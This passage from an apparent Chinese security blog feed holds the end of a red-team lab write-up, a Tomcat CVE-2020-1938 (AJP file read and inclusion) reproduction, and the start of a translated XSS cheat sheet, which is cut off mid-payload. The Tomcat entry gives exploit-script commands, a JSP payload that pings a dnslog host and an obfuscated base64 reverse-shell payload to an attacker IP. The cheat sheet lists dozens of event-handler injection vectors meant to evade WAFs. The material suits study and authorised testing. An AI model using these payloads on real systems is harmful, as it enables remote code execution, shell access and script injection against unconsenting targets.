src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/32.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>然后使用<code>proxychains</code>连接他的3389，<code>proxychains rdesktop 192.168.52.141</code></p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/33.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-3拿下域控"><a href="#4-3拿下域控" class="headerlink" title="4.3拿下域控"></a>4.3拿下域控</h3><p>pass</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队实战</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h3><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h3 id="0x02-前提"><a href="#0x02-前提" class="headerlink" title="0x02 前提"></a>0x02 前提</h3><ul><li><p>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</p><a id="more"></a></li></ul><h3 id="0x03-文件读取-amp-文件包含RCE"><a href="#0x03-文件读取-amp-文件包含RCE" class="headerlink" title="0x03 文件读取&amp;文件包含RCE"></a>0x03 文件读取&amp;文件包含RCE</h3><ul><li>文件读取</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 192.168.52.130</code></pre><p> <img src="/images/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/01.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>文件包含</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 192.168.52.130</code></pre><p><img src="/images/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/02.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>test.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping mdd7e.dnslog.cn&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><h3 id="0x04-反弹shell"><a href="#0x04-反弹shell" class="headerlink" title="0x04 反弹shell"></a>0x04 反弹shell</h3><ul><li>shell.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjE0My84OTg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><p><img src="/images/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/03.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="http://www.svenbeast.com/post/fqSI9laE8/">http://www.svenbeast.com/post/fqSI9laE8/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Tomcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跨站脚本（XSS）备忘录-2019版</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E5%A4%87%E5%BF%98%E5%BD%95-2019%E7%89%88.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E5%A4%87%E5%BF%98%E5%BD%95-2019%E7%89%88.html</url>
    
    <content type="html"><![CDATA[<p>这是一份跨站脚本（XSS）备忘录，收集了大量的XSS攻击向量，包含了各种事件处理、通讯协议、特殊属性、限制字符、编码方式、沙箱逃逸等技巧，可以帮助渗透测试人员绕过WAF和过滤机制。</p><p>译者注：原文由Portswigger公司的Web安全学院于2019年定期更新，对的，就是那家开发著名渗透工具Burp suite的公司，最后更新时间：2019年11月8日星期五10:58:07。</p><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p><strong>不需要用户交互的事件处理程序</strong></p><p>激活元素时触发(IE)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onactivate</span>=alert(1)&gt;&lt;/a&gt;</code></pre><p>页面打印后触发（Chrome、Firefox、IE)</p><a id="more"></a><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onafterprint</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>CSS动画取消时触发(Firefox)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;<span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">left</span>:<span class="hljs-number">0</span>;&#125;<span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">left</span>: <span class="hljs-number">1000px</span>;&#125;&#125;<span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">animation</span>:<span class="hljs-number">10s</span> ease-in-out <span class="hljs-number">0s</span> <span class="hljs-number">1</span> x;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute;&quot;</span> <span class="hljs-attr">onanimationcancel</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>CSS动画结束时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-name:x&quot;</span> <span class="hljs-attr">onanimationend</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>重复CSS动画时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> slidein &#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot;</span> <span class="hljs-attr">onanimationiteration</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>CSS动画开始时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-name:x&quot;</span> <span class="hljs-attr">onanimationstart</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>在激活元素之前触发（IE）</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onbeforeactivate</span>=alert(1)&gt;&lt;/a&gt;</code></pre><p>在停用元素之前触发（IE）</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onbeforedeactivate</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></code></pre><p>在页面打印前触发（Chrome、Firefox、IE)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onbeforeprint</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>网址更改后触发（Chrome）</p><pre><code class="hljs routeros">&lt;svg&gt;&lt;animate <span class="hljs-attribute">onbegin</span>=alert(1) <span class="hljs-attribute">attributeName</span>=x <span class="hljs-attribute">dur</span>=1s&gt;</code></pre><p>svg动画开始时触发（Chrome、Firefox、Safari）</p><pre><code class="hljs routeros">&lt;svg&gt;&lt;animate <span class="hljs-attribute">onbegin</span>=alert(1) <span class="hljs-attribute">attributeName</span>=x <span class="hljs-attribute">dur</span>=1s&gt;</code></pre><p>当元素失去焦点时触发（Chrome、IE、Safari）</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></code></pre><p>选框弹跳时触发（Firefox、IE）</p><pre><code class="hljs routeros">&lt;marquee <span class="hljs-attribute">width</span>=1 <span class="hljs-attribute">loop</span>=1 <span class="hljs-attribute">onbounce</span>=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre><p>如果资源可以播放则触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">oncanplay</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>加载足够的数据以完全播放资源时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;video <span class="hljs-attribute">oncanplaythrough</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validvideo.mp4&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;&lt;/video&gt;</code></pre><p>停用元素时触发（IE）</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">ondeactivate</span>=alert(1)&gt;&lt;/a&gt;&lt;input <span class="hljs-attribute">id</span>=y autofocus&gt;</code></pre><p>资源播放完毕时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio controls autoplay <span class="hljs-attribute">onended</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>资源加载失败或导致错误时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>/<span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>选框完成时触发（Firefox、IE)</p><pre><code class="hljs routeros">&lt;marquee <span class="hljs-attribute">width</span>=1 <span class="hljs-attribute">loop</span>=1 <span class="hljs-attribute">onfinish</span>=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre><p>当元素具有焦点时触发（Chrome、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onfocus</span>=alert(1)&gt;&lt;/a&gt;</code></pre><p>当元素具有焦点时触发（Chrome、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onfocusin</span>=alert(1)&gt;&lt;/a&gt;</code></pre><p>当元素失去焦点时触发（Chrome、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onfocusout</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></code></pre><p>如果哈希值更改，则触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">onhashchange</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</code></pre><p>加载元素时触发（Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>加载第一帧时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">onloadeddata</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>加载元数据时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay <span class="hljs-attribute">onloadedmetadata</span>=alert(1)&gt; &lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>当元素完成加载时触发（Firefox)</p><pre><code class="hljs routeros">&lt;image <span class="hljs-attribute">src</span>=validimage.png <span class="hljs-attribute">onloadend</span>=alert(1)&gt;</code></pre><p>当元素开始加载时触发（Firefox)</p><pre><code class="hljs routeros">&lt;image <span class="hljs-attribute">src</span>=validimage.png <span class="hljs-attribute">onloadstart</span>=alert(1)&gt;</code></pre><p>当从postMessage调用接收到消息事件时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onmessage</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>显示页面时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onpageshow</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>播放资源时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay <span class="hljs-attribute">onplay</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>触发资源正在播放（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay <span class="hljs-attribute">onplaying</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>历史记录更改时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onpopstate</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>svg动画重复时触发（Chrome、Firefox、Safari)</p><pre><code class="hljs routeros">&lt;svg&gt;&lt;animate <span class="hljs-attribute">onrepeat</span>=alert(1) <span class="hljs-attribute">attributeName</span>=x <span class="hljs-attribute">dur</span>=1s <span class="hljs-attribute">repeatCount</span>=2 /&gt;</code></pre><p>调整窗口大小时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">onresize</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</code></pre><p>页面滚动时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onscroll</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">height:1000px</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre><p>选框开始时触发（Firefox、IE)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">alert(1)</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">marquee</span>&gt;</span></code></pre><p>更改时间轴时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio controls autoplay <span class="hljs-attribute">ontimeupdate</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>展开详细信息标签时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">open</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span></code></pre><p>CSS过渡取消时触发（Firefox)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">color</span>: red;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transition:color 10s&quot;</span> <span class="hljs-attr">ontransitioncancel</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>CSS过渡结束时触发（Chrome)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">color</span>:red;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transition:color 1s&quot;</span> <span class="hljs-attr">ontransitionend</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>CSS过渡开始时触发（Firefox)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">180deg</span>);&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transition:transform 2s&quot;</span> <span class="hljs-attr">ontransitionrun</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>未履行承诺时触发（Firefox)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onunhandledrejection</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">fetch(<span class="hljs-string">&#x27;//xyz&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>等待数据时触发（IE）</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">autoplay</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">onwaiting</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;validvideo.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">video/mp4</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span></code></pre><p><strong>需要用户交互的事件处理程序</strong></p><p>右键单击或使用鼠标中键时触发（Chrome、Firefox)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onauxclick</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onbeforecopy</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onbeforecut</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要粘贴一段文字（IE）</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onbeforepaste</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要属性值的变化（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onchange</span>=alert(1) <span class="hljs-attribute">value</span>=xss&gt;</code></pre><p>需要点击一下元素（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>右键单击以显示上下文菜单时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">oncontextmenu</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">oncopy</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">oncut</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>双击元素时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">ondblclick</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>触发拖动元素（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondrag</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre><p>触发拖动已在元素上完成（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragend</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre><p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragenter</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre><p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span 